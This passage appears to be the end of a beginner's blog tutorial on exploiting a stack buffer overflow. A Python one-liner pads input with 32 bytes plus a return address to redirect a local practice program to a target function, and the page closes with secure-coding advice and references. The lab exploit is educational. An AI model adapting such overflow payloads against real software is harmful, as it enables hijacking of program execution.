+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"A"*32 + b"</span><span class="s1">\x96\x91\x04\x08</span><span class="s1">")'</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="n">�</span>
+</pre></div>
+<p>Finally, let's execute this program and pass the Python output as input:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="s1">"$(</span><span class="s1">python3</span> <span class="s1">-</span><span class="s1">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"A"*32 + b"</span><span class="s1">\x96\x91\x04\x08</span><span class="s1">")'</span><span class="s1">)"</span>
+<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> <span class="n">Hello</span><span class="p">,</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="n">�</span><span class="n">Congratulations</span><span class="p">,</span> <span class="n">you</span><span class="n">'ve successfully exploited your first buffer overflow to redirect program flow!</span>
+</pre></div>
+<p>It worked! We've successfully redirected the program flow and executed the <code>targetFunction</code>.</p><br/>
+<h2>Conclusion</h2><br/>
+<p>In conclusion, buffer overflow vulnerabilities are a big risk. When creating your own programs, it's crucial to pay attention to security. This means making sure your code properly checks and validates input, and follows secure coding practices. By taking these steps, you can reduce the chances of buffer overflow exploits and keep your software safer.</p><br/>
+<p>Understanding buffer overflow vulnerabilities can be tough—I struggled with it too. But with perseverance and research, it starts to make sense. In this article, we covered what a buffer overflow vulnerability is and how to exploit a simple case. While you're unlikely to encounter this exact scenario in real-world situations, it's a good starting point for learning. In future articles, we'll delve into more advanced techniques for achieving code execution and privilege escalation. Stay tuned for deeper insights into cybersecurity!</p><br/>
+<p>Personally, I have a soft spot for memory corruption vulnerabilities, and this one is among my favorites. I hope you've gained some new insights from this article. If you enjoyed it, feel free to follow me on <a href="https://elswix.github.io/about.html">social media</a> to support my work, or just drop me a message to let me know your thoughts. Your feedback is always appreciated!</p><br/>
+<p>Happy Hacking!</p><br/>
+<p>Joaquín (AKA elswix).</p><br/>
+<h2>References</h2><br/>
+<p><a href="https://en.wikipedia.org/wiki/Buffer_overflow">https://en.wikipedia.org/wiki/Buffer_overflow</a>
+<br/>
+<a href="https://ctf101.org/binary-exploitation/buffer-overflow/">https://ctf101.org/binary-exploitation/buffer-overflow/</a>
+<br/>
+<a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">https://en.wikipedia.org/wiki/Stack_buffer_overflow</a>
+<br/>
+<a href="https://owasp.org/www-community/vulnerabilities/Buffer_Overflow">https://owasp.org/www-community/vulnerabilities/Buffer_Overflow</a>
+<br/></p><br/>
+<h2>History references</h2><br/>
+<p><a href="https://en.wikipedia.org/wiki/Buffer_overflow#History">https://en.wikipedia.org/wiki/Buffer_overflow#History</a>
+<br/>
+<a href="https://chat.openai.com">ChatGPT</a></p><br/>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 elswix.github.io</p>
+    </footer>
+</body>
+</html>
